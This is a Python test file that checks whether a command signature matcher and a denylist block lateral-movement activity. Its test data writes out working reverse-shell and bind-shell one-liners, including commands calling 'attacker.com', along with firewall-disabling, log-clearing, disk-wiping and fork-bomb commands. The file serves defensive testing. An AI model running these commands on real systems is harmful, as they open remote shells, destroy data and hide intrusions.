"""Lateral-movement tests (SSH, port scanning, network pivoting).

Verify that the signature matcher and org denylist block reverse
shells, bind shells, firewall changes, and defense-evasion commands.
"""

import pytest

from utils.security.signature_match import check_signature

from .conftest import any_layer_blocks, deny_blocks


# RFC 5737 documentation-range IP used in test payloads (not a real host).
_TEST_IP = "198.51.100.1"


# ---------------------------------------------------------------------------
# 1. Reverse shells
# ---------------------------------------------------------------------------

class TestReverseShells:
    """All common reverse-shell one-liners must be caught."""

    @pytest.mark.parametrize("cmd", [
        f"nc -e /bin/sh {_TEST_IP} 4444",
        "ncat -e /bin/bash attacker.com 8080",
        f"netcat {_TEST_IP} 4444 -e /bin/sh",
    ])
    def test_netcat_reverse_shell(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Netcat reverse shell not blocked: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        f"socat TCP:{_TEST_IP}:4444 EXEC:/bin/bash",
        "socat TCP:attacker.com:8080 EXEC:/bin/sh",
    ])
    def test_socat_reverse_shell(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Socat reverse shell not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        f"mkfifo /tmp/f; nc {_TEST_IP} 4444 < /tmp/f | /bin/sh > /tmp/f",
    ])
    def test_mkfifo_reverse_shell(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Mkfifo reverse shell not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        f"bash -c 'bash -i >& /dev/tcp/{_TEST_IP}/4444 0>&1'",
        "echo x > /dev/tcp/attacker.com/80",
    ])
    def test_bash_dev_tcp_reverse_shell(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"/dev/tcp reverse shell not caught: {cmd!r}"


# ---------------------------------------------------------------------------
# 2. Network listener / bind shells
# ---------------------------------------------------------------------------

class TestNetworkListeners:
    """Bind-shell listeners that wait for inbound connections."""

    @pytest.mark.parametrize("cmd", [
        "nc -l -e /bin/sh -p 4444",
        "ncat -l -e /bin/bash 8080",
        "socat TCP-LISTEN:4444 EXEC:/bin/sh",
    ])
    def test_bind_shells_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Bind shell not blocked: {cmd!r}"


# ---------------------------------------------------------------------------
# 3. Firewall / network-config changes enabling lateral movement
# ---------------------------------------------------------------------------

class TestFirewallEvasion:
    """Disabling firewalls to open lateral-movement paths."""

    @pytest.mark.parametrize("cmd", [
        "iptables -F",
        "ufw disable",
    ])
    def test_firewall_disable_blocked_signature(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Firewall disable not caught by signature: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT",
        "nft add rule inet filter input tcp dport 4444 accept",
    ])
    def test_network_config_changes_blocked(self, cmd):
        assert deny_blocks(cmd), f"Network config change not denied: {cmd!r}"


# ---------------------------------------------------------------------------
# 4. Defense evasion aiding lateral movement
# ---------------------------------------------------------------------------

class TestDefenseEvasion:
    """Clearing audit trails / history to hide lateral movement."""

    @pytest.mark.parametrize("cmd", [
        "history -c",
        "> ~/.bash_history",
        "unset HISTFILE",
        "auditctl -D",
        "setenforce 0",
    ])
    def test_defense_evasion_blocked(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Defense evasion not caught: {cmd!r}"


# ---------------------------------------------------------------------------
# 5. Data destruction (scorched-earth after lateral movement)
# ---------------------------------------------------------------------------

class TestDataDestruction:
    """Destructive commands often used after compromising a host."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf /home",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/urandom of=/dev/sda bs=1M",
    ])
    def test_destruction_blocked(self, cmd):
        v = check_signature(cmd)
        assert v.matched, f"Destructive command not caught: {cmd!r}"

    def test_fork_bomb_blocked(self):
        cmd = ":(){ :|:& };:"
        v = check_signature(cmd)
        assert v.matched, "Fork bomb not caught"
        assert v.rule_id == "destruct-forkbomb"
